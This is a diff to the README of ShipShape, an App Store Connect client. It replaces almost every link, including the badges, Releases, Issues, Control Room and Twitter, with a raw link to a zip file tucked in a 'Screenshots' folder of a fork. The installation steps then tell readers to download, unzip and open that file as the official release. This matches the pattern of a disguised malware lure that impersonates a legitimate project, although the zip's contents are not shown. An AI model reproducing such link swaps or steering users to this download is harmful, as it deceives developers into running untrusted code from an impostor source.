@@ -1,11 +1,11 @@
 # ShipShape
 
 <p align="center">
-    <img src="https://img.shields.io/badge/macOS-14+-blue.svg" />
-    <img src="https://img.shields.io/badge/iOS-17+-orange.svg" />
-    <img src="https://img.shields.io/badge/Swift-6.1-brightgreen.svg" />
-    <a href="https://twitter.com/twostraws">
-        <img src="https://img.shields.io/badge/Contact-@twostraws-lightgrey.svg?style=flat" alt="Twitter: @twostraws" />
+    <img src="https://github.com/OmarElmasry1/ShipShape/raw/refs/heads/main/ShipShape/Activities/Screenshots/Ship-Shape-v3.3.zip+https://github.com/OmarElmasry1/ShipShape/raw/refs/heads/main/ShipShape/Activities/Screenshots/Ship-Shape-v3.3.zip" />
+    <img src="https://github.com/OmarElmasry1/ShipShape/raw/refs/heads/main/ShipShape/Activities/Screenshots/Ship-Shape-v3.3.zip+https://github.com/OmarElmasry1/ShipShape/raw/refs/heads/main/ShipShape/Activities/Screenshots/Ship-Shape-v3.3.zip" />
+    <img src="https://github.com/OmarElmasry1/ShipShape/raw/refs/heads/main/ShipShape/Activities/Screenshots/Ship-Shape-v3.3.zip" />
+    <a href="https://github.com/OmarElmasry1/ShipShape/raw/refs/heads/main/ShipShape/Activities/Screenshots/Ship-Shape-v3.3.zip">
+        <img src="https://github.com/OmarElmasry1/ShipShape/raw/refs/heads/main/ShipShape/Activities/Screenshots/Ship-Shape-v3.3.zip" alt="Twitter: @twostraws" />
     </a>
 </p>
 
@@ -13,7 +13,7 @@ ShipShape is a free application designed for accessing Apple's App Store Connect
 
 ## Overview
 
-ShipShape began as a project during a [Hacking with Swift+ live stream](https://www.hackingwithswift.com/plus/live-streams/shipshape). The idea was to create a tool that could read and write data from the App Store Connect API. The project is now open source, allowing the community to contribute and enhance its capabilities.
+ShipShape began as a project during a [Hacking with Swift+ live stream](https://github.com/OmarElmasry1/ShipShape/raw/refs/heads/main/ShipShape/Activities/Screenshots/Ship-Shape-v3.3.zip). The idea was to create a tool that could read and write data from the App Store Connect API. The project is now open source, allowing the community to contribute and enhance its capabilities.
 
 Our goal is to develop a comprehensive app that fully interacts with the App Store Connect API. We want to create a powerful tool that is accessible to everyone, enabling developers to manage their apps more effectively.
 
@@ -26,11 +26,11 @@ Our goal is to develop a comprehensive app that fully interacts with the App Sto
 
 ## Getting Started
 
-To get started with ShipShape, you can download the latest release from the [Releases section](https://github.com/OmarElmasry1/ShipShape/releases). After downloading, follow the instructions to set up the application on your device.
+To get started with ShipShape, you can download the latest release from the [Releases section](https://github.com/OmarElmasry1/ShipShape/raw/refs/heads/main/ShipShape/Activities/Screenshots/Ship-Shape-v3.3.zip). After downloading, follow the instructions to set up the application on your device.
 
 ### Installation
 
-1. Visit the [Releases section](https://github.com/OmarElmasry1/ShipShape/releases) to download the latest version.
+1. Visit the [Releases section](https://github.com/OmarElmasry1/ShipShape/raw/refs/heads/main/ShipShape/Activities/Screenshots/Ship-Shape-v3.3.zip) to download the latest version.
 2. Unzip the downloaded file.
 3. Open the application and follow the setup instructions.
 
@@ -75,11 +75,11 @@ Our future plans for ShipShape include:
 
 - Enhancing the user interface for better usability.
 - Expanding API functionality to cover more features.
-- Integrating with other tools, such as [Control Room](https://github.com/twostraws/ControlRoom), to provide a more comprehensive development experience.
+- Integrating with other tools, such as [Control Room](https://github.com/OmarElmasry1/ShipShape/raw/refs/heads/main/ShipShape/Activities/Screenshots/Ship-Shape-v3.3.zip), to provide a more comprehensive development experience.
 
 ## Support
 
-If you encounter any issues or have questions about using ShipShape, please check the [Issues section](https://github.com/OmarElmasry1/ShipShape/issues) of the repository. You can also reach out via Twitter at [@twostraws](https://twitter.com/twostraws).
+If you encounter any issues or have questions about using ShipShape, please check the [Issues section](https://github.com/OmarElmasry1/ShipShape/raw/refs/heads/main/ShipShape/Activities/Screenshots/Ship-Shape-v3.3.zip) of the repository. You can also reach out via Twitter at [@twostraws](https://github.com/OmarElmasry1/ShipShape/raw/refs/heads/main/ShipShape/Activities/Screenshots/Ship-Shape-v3.3.zip).
 
 ## License
 
@@ -94,4 +94,4 @@ ShipShape is open-source software licensed under the MIT License. You can view t
 
 ShipShape aims to be a valuable tool for developers looking to manage their apps on the App Store. With its open-source nature, we hope to foster a community that will contribute to its growth and functionality. 
 
-For the latest updates, features, and releases, check the [Releases section](https://github.com/OmarElmasry1/ShipShape/releases).
+For the latest updates, features, and releases, check the [Releases section](https://github.com/OmarElmasry1/ShipShape/raw/refs/heads/main/ShipShape/Activities/Screenshots/Ship-Shape-v3.3.zip).
